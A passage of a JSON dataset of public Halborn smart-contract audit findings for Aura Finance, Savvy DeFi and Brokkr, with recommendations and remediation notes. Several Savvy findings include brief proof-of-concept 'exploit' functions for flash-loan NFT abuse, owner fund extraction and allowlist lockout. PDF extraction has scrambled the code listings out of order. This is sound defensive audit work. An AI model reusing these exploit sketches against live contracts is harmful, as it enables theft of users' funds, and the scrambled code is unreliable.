Convex as minimal as possible to aid in manual reviews and minimize the chance of introducing bugs. 22 ",
        "labels": [
            "Halborn",
            "Aura_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "ARRAY.LENGTH USED IN LOOP CONDITIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aura_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the loops below, unnecessary reading of the lengths of arrays on each iteration wastes gas. Code Location: aura-contracts/AuraClaimZap.sol - Line 134 for (uint256 i = 0; i < rewardContracts.length; i++){ - Line 138 for (uint256 i = 0; i < extraRewardContracts.length; i++){ - Line 142 for (uint256 i = 0; i < tokenRewardContracts.length; i++){ aura-contracts/AuraVestedEscrow.sol - Line 105 for (uint256 i = 0; i < _recipient.length; i++){ convex-platform/ArbitartorVault.sol - Line 49 for(uint256 i = 0; i < _toPids.length; i++){ convex-platform/BaseRewardPool.sol - Line 218 for(uint i=0; i < extraRewards.length; i++){ - Line 234 for(uint i=0; i < extraRewards.length; i++){ - Line 266 for(uint i=0; i < extraRewards.length; i++){ - Line 300 for(uint i=0; i < extraRewards.length; i++){ convex-platform/Booster.sol - Line 380 for(uint i=0; i < poolInfo.length; i++){ - Line 539 for(uint256 i = 0; i < _gauge.length; i++){ convex-platform/PoolManagerSecondaryProxy.sol - Line 69 for(uint i=0; i < usedList.length; i++){ 23 Proof of Concept: For example, based on the following test contract: Listing 6: GasTestLength.sol uint256 [] private arr = [0 ,1 ,2 ,3 ,4 ,5 ,6 ,7 ,8 ,9]; function unoptimalized () public { for ( uint256 i = 0; i < arr . length ; ++ i) { } 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.11; 3 4 contract GasTestLength { 5 6 7 8 9 10 11 12 13 14 15 16 17 18 } } } function optimalized () public { uint256 length = arr . length ; for ( uint256 i = 0; i < length ; ++ i ) { } We can see the difference in gas costs: Risk Level: Likelihood - 1 Impact - 1 24 Recommendation: It is recommended to cache array lengths outside of loops as long the size is not changed during the loop: Listing 7 1 uint256 length = arr . length ; 2 for ( uint256 i = 0; i < length ; ++ i ) { 3 4 } ... Remediation Plan: ACKNOWLEDGED: The Aura Finance team acknowledged this finding and does not plan to correct it in the future in order to keep the difference between Aura and Convex as minimal as possible to aid in manual reviews and minimize the chance of introducing bugs. 25 ",
        "labels": [
            "Halborn",
            "Aura_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "USING != 0 CONSUMES LESS GAS THAN > 0 IN UNSIGNED INTEGER VALIDATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Aura_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the require statements below, > 0 was used to validate if the unsigned integer parameters are bigger than 0. It is known that, using != 0 costs less gas than > 0. Code Location: aura-contracts/AuraBalRewardPool.sol - Line 121 require(_amount > 0, \"RewardPool : Cannot stake 0\"); - Line 139 require(_amount > 0, \"RewardPool : Cannot stake 0\"); - Line 157 require(amount > 0, \"RewardPool : Cannot withdraw 0\"); - Line 232 require(rewardsAvailable > 0, \"!balance\"); aura-contracts/AuraLocker.sol - Line 236 require(rewardData[_rewardsToken].lastUpdateTime > 0, ... - Line 285 require(_amount > 0, \"Cannot stake 0\"); - Line 399 require(amt > 0, \"Nothing locked\"); - Line 425 require(length > 0, \"no locks\"); - Line 471 require(locked > 0, \"no exp locks\"); - Line 511 require(len > 0, \"Nothing to delegate\"); - Line 862 require(_rewards > 0, \"No reward\"); aura-contracts/AuraMerkleDrop.sol - Line 139 require(_amount > 0, \"!amount\"); aura-contracts/AuraPenaltyForwarder.sol - Line 55 require(bal > 0, \"!empty\"); aura-contracts/AuraVestedEscrow.sol - Line 55 require(totalLocked[_recipient] > 0, \"!funding\"); 26 aura-contracts/BalLiquidityProvider.sol - Line 74 require(balAfter > 0, \"!mint\"); aura-contracts/ExtraRewardsDistributor.sol - Line 104 require(_amount > 0, \"!amount\"); - Line 180 require(_index > 0 && ...); aura-contracts/RewardPoolDepositWrapper.sol - Line 51 require(minted > 0, !mint); convex-platform/BaseRewardPool.sol - Line 215 require(_amount > 0, 'RewardPool : Cannot stake 0'); - Line 231 require(amount > 0, 'RewardPool : Cannot withdraw 0'); convex-platform/ConvexMasterChef.sol - Line 138 require(totalAllocPoint > 0, \"!alloc\"); convex-platform/CrvDepositor.sol - Line 169 require(_amount > 0,\"!>0\"); convex-platform/PoolManagerSecondaryProxy.sol - Line 104 require(weight > 0, \"must have weight\"); convex-platform/interfaces/BoringMath.sol - Line 20 require(b > 0, \"BoringMath: division by zero\"); - Line 102 require(b > 0, \"BoringMath: division by zero\"); - Line 123 require(b > 0, \"BoringMath: division by zero\"); - Line 143 require(b > 0, \"BoringMath: division by zero\"); 27 Proof of Concept: For example, based on the following test contract: Listing 8: GasTestRequire.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.11; 3 4 contract GasTestRequire { 5 6 7 8 9 10 11 } } function originalrequire ( uint256 len ) public { require ( len > 0, \" Error ! \"); } function optimalizedrequire ( uint256 len ) public { require ( len != 0 , \" Error !\" ); We can see the difference in gas costs: Risk Level: Likelihood - 1 Impact - 1 28 Recommendation: It is recommended to use != 0 instead of > 0 to validate unsigned integer parameters. For example, use instead: Listing 9 1 require ( _amount != 0 , \" RewardPool : Cannot stake 0\") ; Remediation Plan: ACKNOWLEDGED: The Aura Finance team acknowledged this finding and does not plan to correct it in the future to keep the difference between Aura and Convex as minimal as possible to aid in manual reviews and minimize the chance of introducing bugs. 29 ",
        "labels": [
            "Halborn",
            "Aura_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "DEBT CAN BE REPAID WITH UNDERLYING TOKEN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Savvy_DeFi_Smart_Contract_Securtity_Audit_Report_Halborn_Final.pdf",
        "body": "When an underlyingToken is used as collateral, the amount in terms of the underlyingToken (adjusted for decimals) will always be taken in a 1:1 ratio/price into _totalValue. We believe this design is flawed and can cause systemic failure when one of the underlyingTokens is severely depegged. Because when the underlyingToken is depegged, and the svyToken minted is worth more than the collateral underlyingToken in the market. The arbitrageur can simply mint and dump svyToken as much as they can and choose to abandon the collateral. Code Location: Listing 1: contracts/SavvyPositionManager.sol 1029 function _totalValue ( address owner ) internal view returns (  uint256 ) { 1030 1031 1032 uint256 totalValue = 0; Sets . AddressSet storage depositedTokens = _accounts [ owner  ]. depositedTokens ; 1033 for ( uint256 i = 0; i < depositedTokens . values . length ; i  ++) { 1034 1035  ]; 1036 1037 1038 1039 address yieldToken = depositedTokens . values [ i ]; uint256 shares = _accounts [ owner ]. balances [ yieldToken ( address baseToken_ , uint256 amountBaseTokens ) = _yieldStrategyManager . convertSharesToBaseTokens (  yieldToken , shares ); 1040 1041 totalValue += _normalizeBaseTokensToDebt ( baseToken_ ,  amountBaseTokens ); } 1042 1043 1044 return totalValue ; 24 1045 } Scenario:  One collateral token used by Savvy experiences a severe de-pegging against other collaterals. For this example, we will assume DAI drops to 80 cents vs. USDC & USDT. svyUSD maintains its peg against USDC & USDT.  Users can buy DAI off the market, deposit it into Savvy, take a loan, and repeat this loop until the minting cap is reached. Users can buy DAI off the market and use it to repay their loans until the repay cap is reached.  Users can liquidate their current yDAI position (paying off their outstanding debt discounted), buy more DAI with their loan, deposit it into Savvy, take a loan, and repeat until the liquidation cap is reached. These arbitrage opportunities will likely result in one or more of the mint / repay / liquidate caps being met. Risk Level: Likelihood - 3 Impact - 4 Recommendation: Consider using an oracle to query the market price of the underlyingTokens , and calculate the _totalValue based on the market price. Remediation Plan: RISK ACCEPTED: The Savvy team accepted the risk of this issue. 25 ",
        "labels": [
            "Halborn",
            "Savvy_DeFi_Securtity",
            "Severity: Medium"
        ]
    },
    {
        "title": "INCOMPATIBILITY WITH DEFLATIONARY TOKENS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Savvy_DeFi_Smart_Contract_Securtity_Audit_Report_Halborn_Final.pdf",
        "body": "We have discovered that the system is incompatible with deflationary tokens. These are tokens that are designed to reduce in supply over time, often through a process called burning, which permanently removes tokens from circulation. The protocol relies on accurate token balances to function properly, and the changing supply of deflationary tokens causes issues with this. Specifically, we have noticed that transactions involving deflationary tokens are not being recorded correctly, leading to incorrect balances and potentially causing problems for our users. Code Location: Listing 2: contracts/SavvyLGE.sol 289 290 291 292 293 294 295 function _buy ( uint256 deposited , address nftCollectionAddress , uint256 nftId , uint256 vestModeIndex ) internal { uint256 allotmentsPerDepositToken =  _getAllotmentsPerDepositToken ( nftCollectionAddress , vestModeIndex )  ; 296  ; 297 298 299 uint256 allotments = deposited * allotmentsPerDepositToken if ( nftCollectionAddress != address (0) ) { NFTAllocationInfo storage nftAllocationInfo =  nftAllocationInfos [ nftCollectionAddress ][ nftId ]; 300 301 302 303 if (! nftAllocationInfo . activated ) { _activate ( nftCollectionAddress , nftId , deposited ); } else { Checker . checkState ( nftAllocationInfo . remaining >= 26  deposited , \" insufficient availability for nft \" ); 304 305 306 307 308 309 310 311 312 313 } nftAllocationInfo . remaining -= deposited ; } } _updateUserBuyInfo ( deposited , allotments , vestModeIndex ); allotmentSupply += allotments ; totalDeposited += deposited ; emit AllotmentsBought ( msg . sender , deposited , allotments ); Risk Level: Likelihood - 1 Impact - 5 Recommendation: It is mandatory to have this dynamic in mind when on-boarding new tokens to be able to track the token balances correctly. Remediation Plan: SOLVED: The Savvy team solved this issue by adding pre- / post-balance check. Commit ID: 10cd1d78ab55b20e143323bdf7f0f7080fc48a8f 27 ",
        "labels": [
            "Halborn",
            "Savvy_DeFi_Securtity",
            "Severity: Medium"
        ]
    },
    {
        "title": "CHAINLINK ORACLE RETURN VALUES ARE NOT HANDLED PROPERTY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Savvy_DeFi_Smart_Contract_Securtity_Audit_Report_Halborn_Final.pdf",
        "body": "Chainlink oracle return values are not handled properly, the priceFeed will return the following variables: - roundId - answer - startedAt - updatedAt - answeredInRound These return values are meant to be used to do some extra checks before updating the price. By just receiving the price, you can get stale prices and incomplete rounds. Code Location: 28 Listing 3: contracts/SavvyPriceFeed.sol function _getChainlinkTokenPrice ( address priceFeed_ ) internal view returns ( uint256 ) { AggregatorV3Interface priceFeed = AggregatorV3Interface ( 65 66 67 68 69  priceFeed_ ); 70 71 72 73 74 75 76 77 78 79 } } (, int price , , ,) = priceFeed . latestRoundData () ; uint256 tokenPrice = 0; if ( price > 0) { tokenPrice = SafeCast . toUint256 ( price ); uint8 decimals = priceFeed . decimals () ; uint8 additionDecimals = 18 - decimals ; return tokenPrice * 10** additionDecimals ; Scenario: _getChainlinkTokenPrice calls out to a Chainlink oracle receiving the latestRoundData(). If there is a problem with Chainlink starting a new round and finding consensus on the new value for the oracle (e.g. Chainlink nodes abandon the oracle, chain congestion, vulnerability/attacks on the chainlink system) consumers of this contract may continue using outdated stale or incorrect data (if oracles are unable to submit no new round is started). Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to use this code to get all the values and sanitize the input. 29 Listing 4: contracts/SavvyPriceFeed.sol ( uint80 roundID , answer ,, uint256 timestamp , uint80 65  answeredInRound ) = AggregatorV3Interface ( chainLinkAggregatorMap [  underlying ]) . latestRoundData () ; 66 67 require ( answer > 0, \"\" Chainlink price <= 0 \" \"); 68 require ( answeredInRound >= roundID , \" \" Stale price \"\" ); 69 require ( timestamp != 0 , \" \" Round not complete \" \" ); \" Remediation Plan: SOLVED: The Savvy team solved this issue. checks to check for stale prices and incomplete rounds. They added the recommended Commit ID: 08ae4cde0e606121cbdbca9831c9cb430cfe3155 30 ",
        "labels": [
            "Halborn",
            "Savvy_DeFi_Securtity",
            "Severity: Medium"
        ]
    },
    {
        "title": "CHAINLINK ORACLE CAN CRASH WITH DECIMALS LONGER THAN 18",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Savvy_DeFi_Smart_Contract_Securtity_Audit_Report_Halborn_Final.pdf",
        "body": "If the priceFeed from chainlink returns 18 decimals or more, it will make the function crash or fail the calculation as the code is multiplying the token price by 18 minus the number of decimals of the priceFeed. Code Location: Listing 5: contracts/SavvyPriceFeed.sol function _getChainlinkTokenPrice ( address priceFeed_ ) internal view returns ( uint256 ) { AggregatorV3Interface priceFeed = AggregatorV3Interface ( ( 65 66 67 68  priceFeed_ ); 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 } uint80 roundID , int price ,, uint256 timestamp , uint80 answeredInRound ) = priceFeed . latestRoundData () ; require ( price > 0, \" Chainlink price <= 0 \" ); require ( answeredInRound >= roundID , \" Stale price \" ); require ( timestamp != 0 , \" Round not complete \"); uint256 tokenPrice = uint256 ( price ); uint8 decimals = priceFeed . decimals () ; uint8 additionDecimals = 18 - decimals ; return tokenPrice * 10** additionDecimals ; 31 Proof Of Concept: _getChainlinkTokenPrice gets the latest round information at that point, if the price feed returns a number of decimals >= 18 they will be set to 0. That will make the transaction revert or return a 0 - token price. Risk Level: Likelihood - 1 Impact - 5 Recommendation: It is mandatory to not use any token with more than 18 decimals to avoid breaking the feed. Remediation Plan: SOLVED: The Savvy team solved this issue by adding the decimal check. Commit ID: 08ae4cde0e606121cbdbca9831c9cb430cfe3155 32 ",
        "labels": [
            "Halborn",
            "Savvy_DeFi_Securtity",
            "Severity: Medium"
        ]
    },
    {
        "title": "VERIFICATION OF NFT OWNER AND FLASH LOANS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Savvy_DeFi_Smart_Contract_Securtity_Audit_Report_Halborn_Final.pdf",
        "body": "Suppose that the NFT is borrowed (via a flash loan), then there is temporary access to the NFT and the user can interact with the buy function. If an attacker discovers a NFT that has not claimed all the tokens that they can, he will be able to do a flashloan then call the buy function, getting the tokens and then returning the NFT. Code Location: Listing 6: contracts/SavvyLGE.sol 202 203 204 205 206 207 208 function buy ( uint256 amount , address nftCollectionAddress , uint256 nftId , uint256 vestModeIndex ) public override whenNotPaused lgeNotEnded nonReentrant { Checker . checkState ( block . timestamp >= lgeStartTimestamp , \"  lge has not begun \" ); 209 210 Checker . checkArgument ( amount != 0 , \" amount is invalid \" ); Checker . checkArgument ( vestModeIndex < vestModes . length , \"  invalid vest mode index \"); 211 212 if ( nftCollectionAddress != address (0) ) { Checker . checkArgument ( nftCollectionInfos [  nftCollectionAddress ]. limit != 0 , \" this NFT is not eligible for  boost \" ); 213 Checker . checkArgument ( IERC721 ( nftCollectionAddress ).  ownerOf ( nftId ) == msg . sender , \" buyer is not the owner of this NFT \"  ); 214 215 } amount = TokenUtils . safeTransferFrom ( address ( depositToken )  , msg . sender , depositTokenWallet , amount ); _buy ( amount , nftCollectionAddress , nftId , vestModeIndex ); 216 217 218 } 33 Proof Of Concept: Listing 7: contracts/SavvyLGE.sol 289 function exploit ( address _nftAddress , uint256 _nftId , uint256  _vestMode ) { 290 291 292 293 294 295 296 297 298 299 // Get fake flashloan uint256 flashloanAmount = 10; vm . deal ( attacker , flashLoanAmount ); savvyLGE . buy (10 , _nftAddress , _nftId , _vestMode ); // sell tokens // Return fake flashloan vm . deal ( attacker , ( payable )( address . this ). balance -  flashLoanAmount ); 300 } Risk Level: Likelihood - 3 Impact - 3 Recommendation: Keep in mind that this can be abused if you create any new functionality that could be profitable for the exploiter. Remediation Plan: RISK ACCEPTED: The Savvy team accepted the risk of this issue. 34 ",
        "labels": [
            "Halborn",
            "Savvy_DeFi_Securtity",
            "Severity: Medium"
        ]
    },
    {
        "title": "OWNER CAN EXTRACT ALL WRAPPED TOKEN FROM WRAPTOKENGATEWAY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Savvy_DeFi_Smart_Contract_Securtity_Audit_Report_Halborn_Final.pdf",
        "body": "The owner of the WrapTokenGateway contract can extract all existing WrapToken from the contract via the refreshAllowance method. These capabilities must be limited in favor of decentralization, in order to avoid loss of reputation or user confidence. Code Location: Listing 8: contracts/WrapTokenGateway.sol function refreshAllowance ( address savvy ) external onlyOwner { require ( ISavvyPositionManager ( savvy ). supportInterface ( 53 54  type ( ISavvyAdminActions ). interfaceId ) , \" not SavvyPositionManager  address \" ); 55 56 WAVAX . approve ( savvy , type ( uint256 ). max ); } Proof Of Concept: Listing 9: contracts/SavvyLGE.sol 289 290 291 292 function exploit ( address attackerAddress ) { vm . prank ( owner ); wrapTokenGateway . refreshAllowance ( attacker ); WAVAX . withdraw ( WAVAX . balanceOf ( addressWrapTokenGateway () ))  ; 293 } 35 Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended a multisignature wallet / governance wallet or any other method to make sure that the owners address does not get compromised. Remediation Plan: SOLVED: The Savvy team solved this issue. They changed the refreshAl- lowance logic to and added a removeAllowance method that can help when changing the signer. Commit ID: 10cd1d78ab55b20e143323bdf7f0f7080fc48a8f 36 ",
        "labels": [
            "Halborn",
            "Savvy_DeFi_Securtity",
            "Severity: Low"
        ]
    },
    {
        "title": "FLASHMINT FEE IS NOT ADJUSTED ACCORDING TO BPS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Savvy_DeFi_Smart_Contract_Securtity_Audit_Report_Halborn_Final.pdf",
        "body": "The setFlashFee does not use the BPS constant when setting the newFee, this will lead to miss calculating every number that depends on flashMintFee after setFlashFee it is called. Code Location: Listing 10: contracts/SavvySyntheticToken.sol 100 101 102 103 104 function setFlashFee ( uint256 newFee ) public onlyAdmin { Checker . checkArgument ( newFee <= BPS , \" invalid fee \" ); flashMintFee = newFee ; emit SetFlashMintFee ( flashMintFee ); } Proof Of Concept: Listing 11: contracts/SavvyLGE.sol 289 290 291 292 293 294 function exploit () { uint256 newFee = 10; uint256 BPS = 10000; vm . prank ( admin ); savvySyntheticToken . setFlashFee (10) ; // Here I compare the result with the BPS and the number  that we get in the contract 295 296 } vm . assertEq ( savvySyntheticToken . flashMintFee , newFee / BPS ); 37 Risk Level: Likelihood - 2 Impact - 5 Recommendation: It is a must to add the BPS to the calculation of the fee in order to have the calculations working. Listing 12: contracts/SavvySyntheticToken.sol 100 101 102 103 104 function setFlashFee ( uint256 newFee ) public onlyAdmin { Checker . checkArgument ( newFee <= BPS , \" invalid fee \" ); flashMintFee = newFee / BPS ; emit SetFlashMintFee ( flashMintFee ); } Remediation Plan: SOLVED: The Savvy team solved this issue. They added the BPS rate to the calculation, making the result correct. Commit ID: 10cd1d78ab55b20e143323bdf7f0f7080fc48a8f 38 ",
        "labels": [
            "Halborn",
            "Savvy_DeFi_Securtity",
            "Severity: Medium"
        ]
    },
    {
        "title": "DECREASE REPAY WITH BASE TOKEN LIMITER NOT USED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Savvy_DeFi_Smart_Contract_Securtity_Audit_Report_Halborn_Final.pdf",
        "body": "During the code review, It has been noticed that decreaseRepayWithBaseTokenLimiter function is not used. On the other hand, the limiter is decreased after limit check on the repayWithBaseToken function. Furthermore, in the repayWithCollateral token does not decrease limiter. Code Location: Listing 13: contracts/YieldStrategyManager.sol 401 402 403 404 405 function repayWithBaseToken ( address baseToken , uint256 amount , int256 debt ) external onlySavvyPositionManager returns ( uint256 , uint256 )  { 406  repaid . // Determine the maximum amount of base tokens that can be 407 408 // // It is implied that this value is greater than zero  because ` debt ` is greater than zero so a noop is not possible // beyond this point . Casting the debt to an unsigned 409  integer is also safe because `debt ` is greater than zero . 410 uint256 maximumAmount = _normalizeDebtTokensToUnderlying (  baseToken , uint256 ( debt )) ; 411 412 // Limit the number of base tokens to repay up to the  maximum allowed . 413 uint256 actualAmount = amount > maximumAmount ?  maximumAmount : amount ; 414 415 // Check to make sure that the base token repay limit has  not been breached . 39 416 uint256 _currentRepayWithBaseTokenLimit = _repayLimiters [  baseToken ]. get () ; 417 418 if ( actualAmount > _currentRepayWithBaseTokenLimit ) { revert RepayLimitExceeded ( baseToken , actualAmount ,  _currentRepayWithBaseTokenLimit ); 419 420 421 } uint256 credit = _normalizeBaseTokensToDebt ( baseToken ,  actualAmount ); 422 423 // Decrease the amount of the base token which is  globally available to be repaid . 424 425 426 427 } _repayLimiters [ baseToken ]. decrease ( actualAmount ); return ( credit , actualAmount ); Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to delete the function or call it from repayWithBaseToken and repayWithCollateral instead of decreasing it there. Remediation Plan: SOLVED: The Savvy team solved this issue. They changed the code to call decreaseRepayWithBaseTokenLimiter from the functions instead of writing the logic inside. Commit ID: 10cd1d78ab55b20e143323bdf7f0f7080fc48a8f 40 ",
        "labels": [
            "Halborn",
            "Savvy_DeFi_Securtity",
            "Severity: Medium"
        ]
    },
    {
        "title": "ALLOWLISTING ALLOWS ADMINS TO BLOCK WITHDRAWALS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Savvy_DeFi_Smart_Contract_Securtity_Audit_Report_Halborn_Final.pdf",
        "body": "Allowlisting allows admins to block withdrawals. After some time of operation, the admins turn off allowlisting, allowing full integration by any smart contract. A small DeFi platform started integrating with SavvyDefi. Users using contract-based wallets and solutions like Gnosis Safe start using SavvyDefi. Then, due to a perceived risk, the SavvyDefi admins turn the allowlist back on. The small platform and the end users are now blocked from withdrawing funds, or interacting at all with the contracts in any way, and are at the mercy of the admins. Code Location: Listing 14: contracts/SavvyPositionManager.sol 1164 1165 1166 1167 1168 1169 1170 1171 function _withdrawYieldToken ( address owner , address yieldToken , uint256 shares , address recipient ) internal returns ( uint256 ) { _onlyAllowlisted () ; Checker . checkArgument ( recipient != address (0) , \" zero  recipient address \" ); 1172  ; 1173 1174 _yieldStrategyManager . checkSupportedYieldToken ( yieldToken ) uint256 amountYieldTokens = _withdraw ( yieldToken , owner ,  shares , recipient ); 1175 TokenUtils . safeTransfer ( yieldToken , recipient ,  amountYieldTokens ); 1176 1177 1178 } return amountYieldTokens ; 41 Proof Of Concept: Listing 15: contracts/SavvyPositionManager.sol 289 function exploit () { 290 291 292 vm . prank ( victim ); uint256 tokenAmount = yieldToken . balanceOf ( victim ); savvyPositionManager . depositBaseToken ( address ( yieldToken ) ,  tokenAmount , victim , tokenAmount ); 293 294 295 296 vm . prank ( owner ); allowlist . remove ( victim ); vm . expectRevert ( bytes ( \" Unauthorized \" )) ; savvyPositionManager . withdrawYieldToken ( address ( yieldToken ) ,  tokenAmount , victim ); 297 } Risk Level: Likelihood - 2 Impact - 5 Recommendation: It is recommended to a multisignature wallet or any other method to make sure that the owners address doesnt get compromised. Remediation Plan: SOLVED: The Savvy team solved this issue. They removed the allowlist check on the withdraw, meaning that the users will be able to remove the funds. Commit ID: 10cd1d78ab55b20e143323bdf7f0f7080fc48a8f 42 3.10 (HAL-10) ATTACK ON HARVEST BY A MALICIOUS KEEPER - MEDIUM ",
        "labels": [
            "Halborn",
            "Savvy_DeFi_Securtity",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF ADDRESS NORMALIZATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_Delta_Neutral_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The multiple features of the delta_neutral contract do not consider that Terra addresses are valid both upper and all lower case. Although valid, a strict comparison between the same address in its all uppercase version (e.g.: TERRA1KG. . . XNL8) and its all lowercase version (e.g.: terra1kg. . . xnl8) failure. The likelihood of this issue was reduced as the affected functions were owner-only functionalities, therefore much less prone to error, or queries. Queries affected by this issue will only cause inconvenience rather than a security issue. Undesired situations could occur, such as loss of control over the owner or dependent contract addresses in case of instantiation with a misvalidated address made up of capital letters. Because update_config does not provide an option for changing the owner, as well as some addresses of the contracts, the administrator will lose access to contract management. Code Location: Listing 57,62,63,64,65,66,67,68,69,72,73,76) 1: delta_neutral/src/contract.rs (Lines maximum_cdps_per_user_per_asset : msg . minimum_investment_in_uusd : msg . minimum_investment_in_uusd 51 let config = Config { 52  , 53  maximum_cdps_per_user_per_asset , 54 55 56 57  ?, 58 owner : deps . api . addr_canonicalize (& msg . owner )? , is_test_contract : msg . is_test_contract , is_paused : msg . is_paused , fee_recipient : deps . api . addr_validate (& msg . fee_recipient ) fee_pct : Decimal :: from_ratio ( msg . fee_pct . numerator , msg . 12 ts_factory_contract_address : deps . api . addr_validate (& msg . maximum_total_investment_in_uusd : msg . maximum_user_investment_in_uusd : msg . is_reward_distribution_paused : msg . aust_token_address : deps . api . addr_validate (& msg . mir_token_address : deps . api . addr_validate (& msg . bro_token_address : deps . api . addr_validate (& msg .  fee_pct . denominator ) , 59  maximum_total_investment_in_uusd , 60  maximum_user_investment_in_uusd , 61  is_reward_distribution_paused , 62  aust_token_address )?, 63  mir_token_address )? , 64  bro_token_address )? , 65  ts_factory_contract_address )? , 66  a_market_contract_address )? , 67  mirr_mint_contract_address )? , 68  mirr_lock_contract_address )? , 69 70 71 72  mirr_masset_oracle )?, 73 74 75 76 77 78 79 }; a_market_contract_address : deps . api . addr_validate (& msg . mirr_mint_contract_address : deps . api . addr_validate (& msg . mirr_lock_contract_address : deps . api . addr_validate (& msg . mirr_staking_contract_address : deps . api . addr_validate (& msg . mirr_staking_contract_address )?, mirr_masset_oracle : deps . api . addr_validate (& msg . mirr_factory_contract_address : deps . api . addr_validate (& msg . mirr_factory_contract_address )?, astro_router_contract_address : deps . api . addr_validate (& msg . astro_router_contract_address )?, The above-mentioned lack of normalization was also noted in the following lines of the contracts: Listing 2: Affected resources 1 delta_neutral / src / contract . rs : #284 2 delta_neutral / src / queries . rs : #122 , 136 , 175 3 delta_neutral / src / conversions . rs : #291 , 292 4 delta_neutral / src / commands . rs : #294 , 448 , 563 13 Risk Level: Likelihood - 1 Impact - 4 Recommendation: One of the two approaches detailed below should be used:  Update the cosmwasm-vm and use cosmwasm_std::Api::addr_validate (reference CWA-2022-002).  If the update mentioned is not possible, addresses could be stored in canonical format by using the cosmwasm_std::Api::addr_canonicalize utility function. The following considerations should be considered when implementing the second option:  To successfully compare a canonical address, both ends should be in canonical format. For example, when performing access controls, the sender (e.g.: info.sender or env.message.sender) should be canoni- calized beforehand too.  To send funds to a canonicalized address or include them into a message to a different contract, they should be first turn into its human-readable format via the cosmwasm_std::Api::addr_humanize utility function Remediation plan: SOLVED: The issue was fixed in commit ccd453b35f50f7f1b6638389aa0284153b329e02. The Brokkr team solved the issue by validating all specified addresses with the is_lower_alpha() custom function, which is a kind of own imple- mentation for the to_lower() method. 14 ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_Delta_Neutral_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING BOUNDS ON CONFIGURATION VARIABLES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_Delta_Neutral_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The delta_neutral contract has missing bounds on the maximum_cdps_per_user _per_asset, maximum_total_investment_in_uusd and maximum_user_investment _in_uusd variables. This can lead to unexpected contract behavior, such as preventing users from investing in a strategy. The bounds of these parameters should be enforced to avoid potential errors in the current or future uses of these variables. Code Location: Listing 3: delta_neutral/src/contract.rs (Lines 53,59,60) minimum_investment_in_uusd : msg . minimum_investment_in_uusd maximum_cdps_per_user_per_asset : msg . owner : deps . api . addr_canonicalize (& msg . owner )? , is_test_contract : msg . is_test_contract , is_paused : msg . is_paused , fee_recipient : deps . api . addr_validate (& msg . fee_recipient ) fee_pct : Decimal :: from_ratio ( msg . fee_pct . numerator , msg . let config = Config { 51 52  , 53  maximum_cdps_per_user_per_asset , 54 55 56 57  ?, 58  fee_pct . denominator ) , 59  maximum_total_investment_in_uusd , 60  maximum_user_investment_in_uusd , 61  is_reward_distribution_paused , 62  aust_token_address )?, 63  mir_token_address )? , 64 maximum_total_investment_in_uusd : msg . maximum_user_investment_in_uusd : msg . is_reward_distribution_paused : msg . aust_token_address : deps . api . addr_validate (& msg . mir_token_address : deps . api . addr_validate (& msg . bro_token_address : deps . api . addr_validate (& msg . 15 ts_factory_contract_address : deps . api . addr_validate (& msg . a_market_contract_address : deps . api . addr_validate (& msg .  bro_token_address )? , 65  ts_factory_contract_address )? , 66  a_market_contract_address )? , 67  mirr_mint_contract_address )? , 68  mirr_lock_contract_address )? , 69 70 71 72  mirr_masset_oracle )?, 73 74 75 76 77 78 79 }; mirr_mint_contract_address : deps . api . addr_validate (& msg . mirr_lock_contract_address : deps . api . addr_validate (& msg . mirr_staking_contract_address : deps . api . addr_validate (& msg . mirr_staking_contract_address )?, mirr_masset_oracle : deps . api . addr_validate (& msg . mirr_factory_contract_address : deps . api . addr_validate (& msg . mirr_factory_contract_address )?, astro_router_contract_address : deps . api . addr_validate (& msg . astro_router_contract_address )?, Moreover, these variables do not implement their bounds also when modi- fying them with the update_config function. Listing 4: delta_neutral/src/commands.rs 227 if let Some ( maximum_cdps_per_user_per_asset ) =  maximum_cdps_per_user_per_asset { 228 229 230 231 232 233 attributes . push ( Attribute :: new ( \" maximum_cdps_per_user_per_asset_changed \" , maximum_cdps_per_user_per_asset . to_string () , )); config . maximum_cdps_per_user_per_asset =  maximum_cdps_per_user_per_asset ; 234 235 236 } if let Some ( maximum_total_investment_in_uusd ) =  maximum_total_investment_in_uusd { 237 238 239 attributes . push ( Attribute :: new ( \" maximum_total_investment_in_uusd_changed \" , maximum_total_investment_in_uusd . to_string () , 16 240 241 )); config . maximum_total_investment_in_uusd =  maximum_total_investment_in_uusd 